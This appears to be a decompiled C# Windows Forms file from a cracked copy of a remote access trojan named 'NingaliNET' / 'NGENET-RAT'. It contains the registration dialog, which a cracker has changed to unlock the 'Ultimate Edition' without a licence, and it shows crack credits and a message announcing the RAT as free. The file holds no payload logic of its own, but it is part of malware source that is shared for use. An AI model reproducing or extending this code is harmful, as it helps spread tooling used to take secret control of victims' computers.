using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using NINGALINET.My;

namespace NINGALINET
{
	// Token: 0x0200000B RID: 11
	[DesignerGenerated]
	public partial class Form2 : Form
	{
		// Token: 0x060002AC RID: 684 RVA: 0x00002F7A File Offset: 0x0000117A
		[DebuggerNonUserCode]
		static Form2()
		{
			// Note: this type is marked as 'beforefieldinit'.
			Class2.zP7eVJHzSiX6G();
			Form2.__ENCList = new List<WeakReference>();
		}

		// Token: 0x060002AD RID: 685 RVA: 0x00002F8B File Offset: 0x0000118B
		public Form2()
		{
			Class2.zP7eVJHzSiX6G();
			base..ctor();
			base.Load += new EventHandler(this.Form2_Load);
			Form2.__ENCAddToList(this);
			this.LO = new FileInfo(Application.ExecutablePath);
			this.InitializeComponent();
		}

		// Token: 0x060002AE RID: 686 RVA: 0x0001C374 File Offset: 0x0001A574
		[DebuggerNonUserCode]
		private static void __ENCAddToList(object value)
		{
			List<WeakReference> _ENCList = Form2.__ENCList;
			checked
			{
				lock (_ENCList)
				{
					if (Form2.__ENCList.Count == Form2.__ENCList.Capacity)
					{
						int num = 0;
						int arg_37_0 = 0;
						int num2 = Form2.__ENCList.Count - 1;
						int num3 = arg_37_0;
						while (true)
						{
							int arg_7D_0 = num3;
							int num4 = num2;
							if (arg_7D_0 > num4)
							{
								break;
							}
							WeakReference weakReference = Form2.__ENCList[num3];
							if (weakReference.IsAlive)
							{
								if (num3 != num)
								{
									Form2.__ENCList[num] = Form2.__ENCList[num3];
								}
								num++;
							}
							num3++;
						}
						Form2.__ENCList.RemoveRange(num, Form2.__ENCList.Count - num);
						Form2.__ENCList.Capacity = Form2.__ENCList.Count;
					}
					Form2.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
				}
			}
		}

		// Token: 0x17000112 RID: 274
		// (get) Token: 0x060002B1 RID: 689 RVA: 0x0001CA7C File Offset: 0x0001AC7C
		// (set) Token: 0x060002B2 RID: 690 RVA: 0x0001CA94 File Offset: 0x0001AC94
		internal virtual Button Button1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Button1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				if (this._Button1 != null)
				{
					this._Button1.Click -= value2;
				}
				this._Button1 = value;
				if (this._Button1 != null)
				{
					this._Button1.Click += value2;
				}
			}
		}

		// Token: 0x17000113 RID: 275
		// (get) Token: 0x060002B3 RID: 691 RVA: 0x0001CAEC File Offset: 0x0001ACEC
		// (set) Token: 0x060002B4 RID: 692 RVA: 0x00002FC7 File Offset: 0x000011C7
		internal virtual TextBox TextBox2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox2 = value;
			}
		}

		// Token: 0x17000114 RID: 276
		// (get) Token: 0x060002B5 RID: 693 RVA: 0x0001CB04 File Offset: 0x0001AD04
		// (set) Token: 0x060002B6 RID: 694 RVA: 0x00002FD0 File Offset: 0x000011D0
		internal virtual Label Label2
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label2;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label2 = value;
			}
		}

		// Token: 0x17000115 RID: 277
		// (get) Token: 0x060002B7 RID: 695 RVA: 0x0001CB1C File Offset: 0x0001AD1C
		// (set) Token: 0x060002B8 RID: 696 RVA: 0x00002FD9 File Offset: 0x000011D9
		internal virtual TextBox TextBox1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._TextBox1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._TextBox1 = value;
			}
		}

		// Token: 0x17000116 RID: 278
		// (get) Token: 0x060002B9 RID: 697 RVA: 0x0001CB34 File Offset: 0x0001AD34
		// (set) Token: 0x060002BA RID: 698 RVA: 0x00002FE2 File Offset: 0x000011E2
		internal virtual Label Label1
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label1;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label1 = value;
			}
		}

		// Token: 0x17000117 RID: 279
		// (get) Token: 0x060002BB RID: 699 RVA: 0x0001CB4C File Offset: 0x0001AD4C
		// (set) Token: 0x060002BC RID: 700 RVA: 0x00002FEB File Offset: 0x000011EB
		internal virtual Label Label13
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label13;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label13 = value;
			}
		}

		// Token: 0x17000118 RID: 280
		// (get) Token: 0x060002BD RID: 701 RVA: 0x0001CB64 File Offset: 0x0001AD64
		// (set) Token: 0x060002BE RID: 702 RVA: 0x00002FF4 File Offset: 0x000011F4
		internal virtual Label Label15
		{
			[DebuggerNonUserCode]
			get
			{
				return this._Label15;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._Label15 = value;
			}
		}

		// Token: 0x17000119 RID: 281
		// (get) Token: 0x060002BF RID: 703 RVA: 0x0001CB7C File Offset: 0x0001AD7C
		// (set) Token: 0x060002C0 RID: 704 RVA: 0x00002FFD File Offset: 0x000011FD
		internal virtual PictureBox PictureBox3
		{
			[DebuggerNonUserCode]
			get
			{
				return this._PictureBox3;
			}
			[DebuggerNonUserCode]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				this._PictureBox3 = value;
			}
		}

		// Token: 0x060002C1 RID: 705 RVA: 0x0001CB94 File Offset: 0x0001AD94
		private void Button1_Click(object sender, EventArgs e)
		{
			this.Button1.Text = "3iezW0rld - TurkHacker346 NGENET-RAT";
			MyProject.Forms.Form1.Label13.Text = "3iezW0rld - TurkHacker346 NGENET-RAT Cracked";
			MyProject.Forms.Form1.Edition = "3iezW0rld - TurkHacker346 NGENET-RAT Cracked";
			Fungsi.STV("USER", this.TextBox1.Text);
			Fungsi.STV("PASSWORD", this.TextBox2.Text);
			MyProject.Forms.Form1.ULT = true;
			MessageBox.Show("Rat Beleştir registiration'a falan gerek yok beyler Cracked by 3iezW0rld - TurkHacker", "Information", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			MyProject.Forms.Form1.sl.Text = "Your use NingaliNET - Ultimate Edition ";
			MyProject.Forms.Form1.Label15.Text = "Cracked by " + Fungsi.GTV("USER", this.TextBox1.Text);
			this.Close();
		}

		// Token: 0x060002C2 RID: 706 RVA: 0x0001CC84 File Offset: 0x0001AE84
		private void Form2_Load(object sender, EventArgs e)
		{
			if (Operators.CompareString(MyProject.Forms.Form1.Edition, "TurkHacker346 NGENET-RAT Cracked", false) == 0)
			{
				this.Button1.Text = "NoRegister";
				MyProject.Forms.Form1.Edition = "TurkHacker346 NGENET-RAT Cracked";
				this.TextBox1.Text = Fungsi.GTV("USER", this.TextBox1.Text);
				this.TextBox2.Text = Fungsi.GTV("PASSWORD", this.TextBox2.Text);
				this.TextBox2.PasswordChar = '*';
				this.TextBox1.Enabled = false;
				this.TextBox2.Enabled = false;
			}
			else if (Operators.CompareString(MyProject.Forms.Form1.Edition, "TurkHacker346 NGENET-RAT Cracked", false) == 0)
			{
				this.Button1.Text = "Unregister";
				MyProject.Forms.Form1.Edition = "TurkHacker346 NGENET-RAT Cracked";
				this.TextBox1.Text = Fungsi.GTV("USER", this.TextBox1.Text);
				this.TextBox2.Text = Fungsi.GTV("PASSWORD", this.TextBox2.Text);
				this.TextBox2.PasswordChar = '*';
				this.TextBox1.Enabled = false;
				this.TextBox2.Enabled = false;
			}
			else
			{
				this.TextBox1.Text = Fungsi.GTV("USER", this.TextBox1.Text);
				this.TextBox2.Text = Fungsi.GTV("PASSWORD", this.TextBox2.Text);
				this.TextBox2.PasswordChar = '\0';
				this.TextBox1.Enabled = true;
				this.TextBox2.Enabled = true;
				this.Button1.Text = "NoRegister";
			}
		}

		// Token: 0x04000139 RID: 313
		private static List<WeakReference> __ENCList;

		// Token: 0x0400013B RID: 315
		[AccessedThroughProperty("Button1")]
		private Button _Button1;

		// Token: 0x0400013C RID: 316
		[AccessedThroughProperty("TextBox2")]
		private TextBox _TextBox2;

		// Token: 0x0400013D RID: 317
		[AccessedThroughProperty("Label2")]
		private Label _Label2;

		// Token: 0x0400013E RID: 318
		[AccessedThroughProperty("TextBox1")]
		private TextBox _TextBox1;

		// Token: 0x0400013F RID: 319
		[AccessedThroughProperty("Label1")]
		private Label _Label1;

		// Token: 0x04000140 RID: 320
		[AccessedThroughProperty("Label13")]
		private Label _Label13;

		// Token: 0x04000141 RID: 321
		[AccessedThroughProperty("Label15")]
		private Label _Label15;

		// Token: 0x04000142 RID: 322
		[AccessedThroughProperty("PictureBox3")]
		private PictureBox _PictureBox3;

		// Token: 0x04000143 RID: 323
		public FileInfo LO;

		// Token: 0x04000144 RID: 324
		public object edition;
	}
}
